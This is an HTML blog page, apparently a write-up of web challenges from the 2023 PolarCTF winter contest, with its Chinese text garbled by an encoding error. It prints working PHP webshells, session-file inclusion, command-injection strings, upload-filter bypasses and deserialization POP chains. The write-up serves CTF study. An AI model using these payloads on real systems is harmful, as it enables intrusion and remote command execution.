<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>[2023PolarCTFå†¬å­£èµ›]WEB WP | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="[2023PolarCTFå†¬å­£èµ›]WEB WP | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="WEB
ä½ æƒ³é€ƒä¹Ÿé€ƒä¸æ‰
ç”±äºåœ¨serialize($user)ä¹‹åè¿›è¡Œäº†å­—ç¬¦ä¸²è¿‡æ»¤æ“ä½œï¼Œå°±å¯ä»¥è®©ä¼ å…¥usernameæ¥åæ‰passwdçš„å†…å®¹ï¼Œè¿›è€Œè®©ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç»“æ„å‘ç”Ÿå˜åŒ–ã€‚ç›®çš„æ˜¯åœ¨passwdæ„é€ æ–°çš„signå±æ€§æ¥è¦†ç›–ï¼Œè®©æ–°çš„sign..." />
    <meta name="keywords" content="CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              [2023PolarCTFå†¬å­£èµ›]WEB WP
            </h2>
            <div class="post-info">
              <span>
                2023-12-09
              </span>
              <span>
                7 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
                  # CTF
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023polarctf-dong-ji-sai-web-wp.jpeg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="web">WEB</h1>
<h2 id="ä½ æƒ³é€ƒä¹Ÿé€ƒä¸æ‰">ä½ æƒ³é€ƒä¹Ÿé€ƒä¸æ‰</h2>
<p>ç”±äºåœ¨<code>serialize($user)</code>ä¹‹åè¿›è¡Œäº†å­—ç¬¦ä¸²è¿‡æ»¤æ“ä½œï¼Œå°±å¯ä»¥è®©ä¼ å…¥usernameæ¥åæ‰passwdçš„å†…å®¹ï¼Œè¿›è€Œè®©ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç»“æ„å‘ç”Ÿå˜åŒ–ã€‚ç›®çš„æ˜¯åœ¨passwdæ„é€ æ–°çš„signå±æ€§æ¥è¦†ç›–ï¼Œè®©æ–°çš„signå±æ€§ä¸ºytyydsã€‚</p>
<pre><code class="language-php">&lt;?php
function filter($string){
    return preg_replace( '/phtml|php3|php4|php5|aspx|gif/','', $string);
}
$user['username'] = &quot;skkyphp3php3php3php3php3phtml&quot;;
$user['passwd'] = 'blu3&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;s:6:&quot;passwd&quot;;s:4:&quot;blu3&quot;;}';
$user['sign'] = '123456';
// a:3:{s:8:&quot;username&quot;;s:4:&quot;skky&quot;;s:6:&quot;passwd&quot;;s:4:&quot;blu3&quot;;s:4:&quot;sign&quot;;s:6:&quot;ytyyds&quot;;}s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;}
$ans = filter(serialize($user));
echo $ans.PHP_EOL;
//$s = 'a:3:{s:8:&quot;username&quot;;s:4:&quot;skky&quot;;s:6:&quot;passwd&quot;;}&quot;;s:4:&quot;blu3&quot;;s:4:&quot;sign&quot;;s:6:&quot;123456&quot;;}';
var_dump(unserialize($ans));
</code></pre>
<h2 id="éšæœºå€¼">éšæœºå€¼</h2>
<p>ç”¨å–å€ç¬¦å·è®©Polar1å’ŒNightåœ¨Polar2å’ŒLightè¢«èµ‹éšæœºå€¼çš„æ—¶å€™ä¸€èµ·å˜åŒ–ã€‚</p>
<pre><code class="language-php">&lt;?php
class Index{
    private $Polar1;
    private $Polar2;
    protected $Night;
    protected $Light;

    public function __construct(){
        $this-&gt;Polar1 = &amp; $this-&gt;Polar2;
        $this-&gt;Night = &amp; $this-&gt;Light;
    }
}
echo serialize(new Index());
</code></pre>
<h2 id="safe_include">safe_include</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php 
show_source(__FILE__); 
@session_start();

ini_set('open_basedir', '/var/www/html/:/tmp/'); 

$sys = @$_SESSION['xxs'];
if (isset($_GET['xxs'])) {
    $sys = $_GET['xxs'];
}

@include $sys;

$_SESSION['xxs'] = $sys;
</code></pre>
<p>basediré™åˆ¶ï¼ŒåŒæ—¶å¼€å¯äº†çš„sessionï¼Œè€ƒè™‘åŒ…å«sessionã€‚</p>
<p>å°è¯•ç”¨Cookieä¸­çš„<code>PHPSESSID=gul18or2ajo45rsfgk416afq95</code>ï¼Œç»“åˆphpä¼ªåè®®è¯»session<code>/?xss=php://filter/convert.base64-encode/resource=/tmp/sess_gul18or2ajo45rsfgk416afq95</code>ï¼Œå‘ç°å¯ä»¥è¯»ï¼ŒåŒæ—¶ç¡®å®šäº†sessionæ–‡ä»¶ä¿å­˜ä½ç½®ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1702128789787.png" alt="" loading="lazy"></p>
<p>æ ¹æ®ä»£ç é€»è¾‘ï¼Œç¬¬ä¸€æ¬¡è®¿é—®åœ¨sessionä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œç¬¬äºŒæ¬¡è®¿é—®åŒ…å«è¿™ä¸ªsessionã€‚ç”¨ä¸¤æ¬¡è¯·æ±‚æ¥æ‰§è¡Œä¸€æ¬¡å‘½ä»¤</p>
<pre><code>/?xxs=&lt;?php system($_GET[skky]);?&gt;
/?xxs=/tmp/sess_gul18or2ajo45rsfgk416afq95&amp;skky=ls /
</code></pre>
<p>è¯»å–flag<br>
<img src="https://skyblu3519.github.io/post-images/1702128804668.png" alt="" loading="lazy"></p>
<h2 id="cool">cool</h2>
<p>shell_execæ‰§è¡Œå‘½ä»¤ï¼Œç”¨é€šé…ç¬¦è¯»flagï¼Œpayload</p>
<pre><code class="language-php">/?a=echo shell_exec(&quot;cat fla*&quot;);
</code></pre>
<h2 id="phpurl">phpurl</h2>
<p>æç¤ºçš„åŠ å¯†å­—ç¬¦ä¸²æ˜¯base64ï¼Œè§£ç æ‰¾åˆ°<code>index.phps</code>ã€‚urläºŒæ¬¡ç¼–ç æ‹¿åˆ°flag</p>
<pre><code>/index.php?sys=%25%37%38%25%37%38%25%37%33
</code></pre>
<h2 id="ä½ çš„é©¬å‘¢">ä½ çš„é©¬å‘¢ï¼Ÿ</h2>
<p>ç‚¹å¼€é¢˜ç›®å‘ç°index.phpå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼š<code>/index.php?file=upload.php</code>ã€‚</p>
<p>ä¸Šä¼ çš„ç‚¹è¿‡æ»¤äº†æ‰€æœ‰å¯ä»¥è§£æä¸ºphpçš„åç¼€ï¼ŒåŒæ—¶å¯¹æ–‡ä»¶å†…å®¹è¿‡æ»¤äº†<code>&lt;?php</code>ã€‚</p>
<p>ä¸Šä¼ çŸ­æ ‡ç­¾ï¼Œç»“åˆæ–‡ä»¶åŒ…å«æ‰§è¡Œå‘½ä»¤</p>
<pre><code>&lt;?=`cat /flag.txt`?&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1702128832080.png" alt="" loading="lazy"></figure>
<p>æ–‡ä»¶åŒ…å«<code>/index.php?file=uploads/skky</code><br>
<img src="https://skyblu3519.github.io/post-images/1702128842062.png" alt="" loading="lazy"></p>
<h2 id="ezphp">ezphp</h2>
<p>ä¸»é¡µ<br>
<img src="https://skyblu3519.github.io/post-images/1702128854141.png" alt="" loading="lazy"></p>
<p>è®¿é—®robots.txt</p>
<pre><code>User-agent: *
Disallow: /file
Disallow: /uploads
Disallow: /uploads/images
</code></pre>
<p><code>/uploads/upload.php</code>ä¸Šä¼ ä¸ª<code>.jpg</code>æ–‡ä»¶</p>
<pre><code>&lt;?php
system($_GET[skky]);
?&gt;
</code></pre>
<p><code>/file/file.php?filename=../uploads/images/skky.jpg</code>æ–‡ä»¶åŒ…å«ï¼Œç”¨<code>find / -name flag*</code>æ‰¾åˆ°flagæ–‡ä»¶ä½ç½®<br>
<img src="https://skyblu3519.github.io/post-images/1702128873530.png" alt="" loading="lazy"></p>
<p>è¯»å–<br>
<img src="https://skyblu3519.github.io/post-images/1702128942967.png" alt="" loading="lazy"></p>
<h2 id="cookieæ¬ºéª—">cookieæ¬ºéª—</h2>
<p>ä¿®æ”¹<code>Cookie:user=admin</code></p>
<h2 id="upload">upload</h2>
<p>æç¤ºæºç <code>/?action=show_code</code>ï¼Œ</p>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
 
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.rand(10000,99999).$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<p>è¿™é‡Œå¯¹æ–‡ä»¶åç¼€æ˜¯æ›¿æ¢ä¸ºç©ºçš„ï¼Œé‡‡ç”¨åŒå†™ç»•è¿‡<code>skky.pphphp</code><br>
<img src="https://skyblu3519.github.io/post-images/1702128969530.png" alt="" loading="lazy"></p>
<h2 id="å¹²æ­£åˆ™">å¹²æ­£åˆ™</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php
error_reporting(0);
if (empty($_GET['id'])) {
    show_source(__FILE__);
    die();
} else {
    include 'flag.php';
    $a = &quot;www.baidu.com&quot;;
    $result = &quot;&quot;;
    $id = $_GET['id'];
    @parse_str($id);
    echo $a[0];
    if ($a[0] == 'www.polarctf.com') {
        $ip = $_GET['cmd'];
        if (preg_match('/flag\.php/', $ip)) {
            die(&quot;don't show flag!!!&quot;);
        }

        $result .= shell_exec('ping -c 2 ' . $a[0] . $ip);
        if ($result) {
            echo &quot;&lt;pre&gt;{$result}&lt;/pre&gt;&quot;;
        }
    } else {
        exit('å…¶å®å¾ˆç®€å•ï¼');
    }
}
</code></pre>
<p><code>parse_str</code>å¯ä»¥å°†å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œç”¨å®ƒæ¥è¦†ç›–<code>$a</code>ã€‚å‘½ä»¤æ‰§è¡Œcmdè¯»å–flagï¼Œç”¨<code>flag.ph*</code>ç»•è¿‡æ­£åˆ™</p>
<pre><code>/?id=a[]=www.polarctf.com&amp;cmd= || cat flag.ph*
</code></pre>
<h2 id="è‹¦æµ·">è‹¦æµ·</h2>
<p>æºç </p>
<pre><code class="language-php">&lt;?php
/*
PolarD&amp;N CTF
*/
error_reporting(1);

class User
{
    public $name = 'PolarNight';
    public $flag = 'syst3m(&quot;rm -rf ./*&quot;);';

    public function __construct()
    {
        echo &quot;åˆ åº“è·‘è·¯ï¼Œè¹²ç›‘ç‹±~&quot;;
    }

    public function printName()
    {
        echo $this-&gt;name;
        return 'ok';
    }

    public function __wakeup()
    {
        echo &quot;hi, Welcome to Polar D&amp;N ~ &quot;;
        $this-&gt;printName();
    }

    public function __get($cc)
    {
        echo &quot;give you flag : &quot; . $this-&gt;flag;
    }
}

class Surrender
{
    private $phone = 110;
    public $promise = 'éµçºªå®ˆæ³•ï¼Œå¥½å…¬æ°‘~';

    public function __construct()
    {
        $this-&gt;promise = 'è‹¦æµ·æ— æ¶¯ï¼Œå›å¤´æ˜¯å²¸ï¼';
        return $this-&gt;promise;
    }

    public function __toString()
    {
        return $this-&gt;file['filename']-&gt;content['title'];
    }
}

class FileRobot
{
    public $filename = 'flag.php';
    public $path;

    public function __get($name)
    {
        $function = $this-&gt;path;
        return $function();
    }

    public function Get_file($file)
    {
        $hint = base64_encode(file_get_contents($file));
        echo $hint;
    }

    public function __invoke()
    {
        $content = $this-&gt;Get_file($this-&gt;filename);
        echo $content;
    }
}

if (isset($_GET['user'])) {
    unserialize($_GET['user']);
} else {
    $hi = new  User();
    highlight_file(__FILE__);
}
</code></pre>
<p>ç›®çš„æ˜¯æ‰§è¡Œåˆ°FileRobotçš„<code>__invoke</code>ï¼Œåˆ†æä»£ç ä¹‹åï¼ŒFileRobotçš„<code>__get</code>æœ‰ä¸ªå¯å˜å‡½æ•°è°ƒç”¨çš„å½¢å¼ã€‚Surrenderä¸­çš„<code>__toString</code>ä»¤<code>$this-&gt;file['filename']</code>ä¸ºä¸€ä¸ªFileRobotå¯¹è±¡æ¥è§¦å‘FileRobotçš„<code>__get</code>ï¼Œæœ€åè¯»å‡º<code>../flag.php</code>ï¼ˆğŸ˜…ï¼‰ã€‚</p>
<p>ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…</p>
<p>popé“¾æ„é€ å¦‚ä¸‹</p>
<pre><code class="language-php">&lt;?php
class User{
    public function __construct()
    {
        $this-&gt;name = new Surrender();
    }

}

class Surrender
{
    public function __construct()
    {
        $o = new FileRobot();
        $o-&gt;path = new FileRobot();
        $this-&gt;file['filename'] = $o;
    }
}

class FileRobot
{
    public $path;
    public $filename = '../flag.php';
}

echo serialize(new User());
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1702128982311.png" alt="" loading="lazy"></figure>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#web">WEB</a>
<ul>
<li><a href="#%E4%BD%A0%E6%83%B3%E9%80%83%E4%B9%9F%E9%80%83%E4%B8%8D%E6%8E%89">ä½ æƒ³é€ƒä¹Ÿé€ƒä¸æ‰</a></li>
<li><a href="#%E9%9A%8F%E6%9C%BA%E5%80%BC">éšæœºå€¼</a></li>
<li><a href="#safe_include">safe_include</a></li>
<li><a href="#cool">cool</a></li>
<li><a href="#phpurl">phpurl</a></li>
<li><a href="#%E4%BD%A0%E7%9A%84%E9%A9%AC%E5%91%A2">ä½ çš„é©¬å‘¢ï¼Ÿ</a></li>
<li><a href="#ezphp">ezphp</a></li>
<li><a href="#cookie%E6%AC%BA%E9%AA%97">cookieæ¬ºéª—</a></li>
<li><a href="#upload">upload</a></li>
<li><a href="#%E5%B9%B2%E6%AD%A3%E5%88%99">å¹²æ­£åˆ™</a></li>
<li><a href="#%E8%8B%A6%E6%B5%B7">è‹¦æµ·</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/2023-gu-jian-shan-web-wp/">
              <h3 class="post-title">
                [2023å¤å‰‘å±±]WEB WP
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
